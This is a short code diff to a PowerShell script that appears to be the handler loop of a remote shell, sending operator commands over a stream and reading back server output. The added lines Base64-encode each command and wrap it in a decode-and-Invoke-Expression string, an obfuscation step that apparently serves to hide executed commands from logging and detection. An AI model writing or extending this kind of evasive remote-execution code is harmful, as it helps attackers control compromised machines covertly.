@@ -166,6 +166,8 @@ while (`$true) {
 	$serverOutput = ""
 	
 	if ($Command) {
+		$Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
+		$Command = "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(""$Command"")) | IEX"
 		$fullCommand = "$Command 2>&1 | Out-String"
 		$sw.WriteLine($fullCommand)
 		$sw.Flush()
